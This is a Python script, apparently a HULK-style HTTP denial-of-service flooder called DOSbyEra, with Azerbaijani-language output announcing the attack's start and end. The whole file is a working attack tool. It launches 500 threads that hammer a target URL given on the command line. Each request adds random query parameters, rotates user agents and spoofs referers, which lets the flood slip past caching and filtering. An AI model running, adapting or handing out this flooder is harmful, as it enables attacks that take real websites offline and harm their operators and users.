import urllib.request, urllib.error, urllib.parse
import sys
import os
import threading
import random
import re
import colorama

url  = ''
host = ''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	os.system('cls')
	print(colorama.Style.BRIGHT + colorama.Fore.RED + str("\t\t@@@@@@@    @@@@@@    @@@@@@   @@@@@@@   @@@ @@@  @@@@@@@@  @@@@@@@    @@@@@@   \n\t\t@@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@ @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  \n\t\t@@!  @@@  @@!  @@@  !@@       @@!  @@@  @@! !@@  @@!       @@!  @@@  @@!  @@@  \n\t\t!@!  @!@  !@!  @!@  !@!       !@   @!@  !@! @!!  !@!       !@!  @!@  !@!  @!@  \n\t\t@!@  !@!  @!@  !@!  !!@@!!    @!@!@!@    !@!@!   @!!!:!    @!@!!@!   @!@!@!@!  \n\t\t!@!  !!!  !@!  !!!   !!@!!!   !!!@!!!!    @!!!   !!!!!:    !!@!@!    !!!@!!!!  \n\t\t!!:  !!!  !!:  !!!       !:!  !!:  !!!    !!:    !!:       !!: :!!   !!:  !!!  \n\t\t:!:  !:!  :!:  !:!      !:!   :!:  !:!    :!:    :!:       :!:  !:!  :!:  !:!  \n\t\t :::: ::  ::::: ::  :::: ::    :: ::::     ::     :: ::::  ::   :::  ::   :::  \n\t\t:: :  :    : :  :   :: : :    :: : ::      :     : :: ::    :   : :   :   : :  "))
	print(f'{colorama.Style.RESET_ALL}{colorama.Fore.MAGENTA}\t\t\t\t\t\t\t\t      𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖒𝖊𝖓𝖙 𝖇𝖞 𝕰𝖗𝖆𝖙𝖔𝖓𝖔𝖘')
	print(f'\n\n\n\n{colorama.Style.BRIGHT}{colorama.Fore.YELLOW}İstifadə Qaydası:{colorama.Fore.BLUE} python3 DOSbyEra.py {colorama.Fore.CYAN}https://link.com' + colorama.Style.RESET_ALL)

def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib.request.urlopen(request)
	except urllib.error.HTTPError as e:
			set_flag(1)
			print(f'{colorama.Style.BRIGHT}{colorama.Fore.YELLOW}{e}')
			print(f'{colorama.Style.BRIGHT}{colorama.Fore.RED}Hücum Başlatıldı.. {url}')
			code=500
	except urllib.error.URLError as e:
			sys.exit()
	else:
			inc_counter()
			urllib.request.urlopen(request)
	return(code)		

	
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception as ex:
			pass

class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous!=request_counter):
				print("%d Request yollandı" % (request_counter))
				previous=request_counter
		if flag==2:
			print(f'\n{colorama.Style.BRIGHT}{colorama.Fore.MAGENTA} Hücum Sonlanıldı')

if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print(f'{colorama.Style.BRIGHT}{colorama.Fore.RED}Hücum Başlatıldı')
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('(https?\://)?([^/]*)/?.*', url)
		host = m.group(2)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
